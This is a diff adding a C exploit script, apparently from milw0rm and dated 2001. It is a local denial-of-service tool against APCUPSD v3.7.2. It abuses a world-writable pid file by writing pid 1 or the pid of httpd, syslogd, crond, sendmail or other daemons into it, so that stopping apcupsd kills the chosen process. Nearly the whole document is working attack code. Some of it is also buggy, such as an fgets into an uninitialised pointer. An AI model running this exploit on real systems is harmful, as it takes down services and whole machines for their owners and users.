@@ -1,0 +1,143 @@
+/* Local Denial of Service for any linux box running APCUPSD v3.7.2 
+ *
+ * APCUPSD has his pid file world writeable, therefore it is possible
+ * to let it kill another pid and create a denial of service against any
+ * running daemon. (when the apcupsd is stopped, for example)
+ *
+ * Bug discovered by: Mattias Dartsch <matze@joonix.de>
+ * Exploit code by: The Itch / BsE 
+ *
+ * Greets fly out to: Tasc, C-Murdah, Calimonk, Zer0, Tozz, Pyra, 
+ * Shadowlady, Wildcoyote, Lucipher, Zephyr, ph33r-the-b33r and aiko
+ */
+ 
+#include <stdio.h>
+
+#define PIDFILE "/var/run/apcupsd.pid"
+
+/* pid file definition (processes that you can choose from to crash)
+ * these pid files and their paths came from a redhat distribution
+ */
+
+#define HTTPDPID "/var/run/httpd.pid"
+#define SYSLOGDPID "/var/run/syslogd.pid"
+#define CRONDPID "/var/run/crond.pid"
+#define KLOGDPID "/var/run/klogd.pid"
+#define INETDPID "/var/run/inetd.pid"
+#define IDENTDPID "/var/run/identd.pid"
+#define SENDMAILPID "/var/run/sendmail.pid"
+
+int dosusage(char *apcfilename)
+{
+	printf("----------------------------\n");
+	printf("\nUsage: %s <number>\n", apcfilename);
+	printf("where number is either:\n");
+	printf("1. crash linux\n");
+	printf("2. crash httpd\n");
+	printf("3. crash klogd\n");
+	printf("4. crash crond\n");
+	printf("5. crash syslogd\n");
+	printf("6. crash inetd\n");
+	printf("7. crash indentd\n");
+	printf("8. crash sendmaild\n\n");	
+	return 0;
+}
+
+int main(int argc, char **argv)
+{
+	FILE *apcpid;
+	FILE *dospidfile;
+	char *dospid[5];
+	int dosarg;
+
+	printf("\nAPCUPSD can be used to crash any linux distribution\n");
+	printf("or any other pid running at that moment when apcupsd is\n");
+ 	printf("stopped or when it gets normally killed using its pid.\n");
+	printf("\nCoded by The Itch / Bse\n\n");
+
+	if(argc < 2) { dosusage(argv[0]); exit(0); }
+	if(atoi(argv[1]) > 8) { dosusage(argv[0]); exit(0); }
+	dosarg = atoi(argv[1]);
+
+	apcpid = fopen(PIDFILE, "r");
+	if(!apcpid)
+	{
+		printf("%s does not exist\n\n", PIDFILE);
+		exit(1);
+	}
+	fclose(apcpid);
+
+	apcpid = fopen(PIDFILE, "w");
+
+	if(dosarg == 1)
+	{
+		/* crash entire linux */
+		fprintf(apcpid, "1");
+	}
+	if(dosarg == 2)
+	{
+		/* crash httpd */
+		dospidfile = fopen(HTTPDPID, "r");
+		fgets(dospid[4], 4, dospidfile);		
+		fclose(dospidfile);				
+		fprintf(apcpid, dospid[4]);
+	}
+	if(dosarg == 3)
+	{
+		/* crash klogd */
+		dospidfile = fopen(KLOGDPID, "r");
+		fgets(dospid[4], 4, dospidfile);
+		fclose(dospidfile);
+		fprintf(apcpid, dospid[4]);
+	}
+	if(dosarg == 4)
+	{
+		/* crash crond */
+		dospidfile = fopen(CRONDPID, "r");
+		fgets(dospid[4], 4, dospidfile);
+		fclose(dospidfile);
+		fprintf(apcpid, dospid[4]);
+	}
+	if(dosarg == 5)
+	{
+		/* crash syslogd */
+		dospidfile = fopen(SYSLOGDPID, "r");
+		fgets(dospid[4], 4, dospidfile);
+		fclose(dospidfile);
+		fprintf(apcpid, dospid[4]);
+	}
+	if(dosarg == 6)
+	{
+		/* crash inetd */
+		dospidfile = fopen(INETDPID, "r");
+		fgets(dospid[4], 4, dospidfile);
+		fclose(dospidfile);
+		fprintf(apcpid, dospid[4]);
+	}
+	if(dosarg == 7)
+	{
+		/* crash identd */
+		dospidfile = fopen(IDENTDPID, "r");
+		fgets(dospid[4], 4, dospidfile);
+		fclose(dospidfile);
+		fprintf(apcpid, dospid[4]);
+	}
+	if(dosarg == 8)
+	{
+		/* crash sendmail */
+		dospidfile = fopen(SENDMAILPID, "r");
+		fgets(dospid[4], 4, dospidfile);
+		fclose(dospidfile);
+		fprintf(apcpid, dospid[4]);
+	}
+	
+	fclose(apcpid);
+	printf("DoS activated, its now a matter of time until apcupsd gets\n");
+	printf("restarted or stopped....\n\n");
+	
+	return 0;
+}
+
+
+
+// milw0rm.com [2001-01-15]
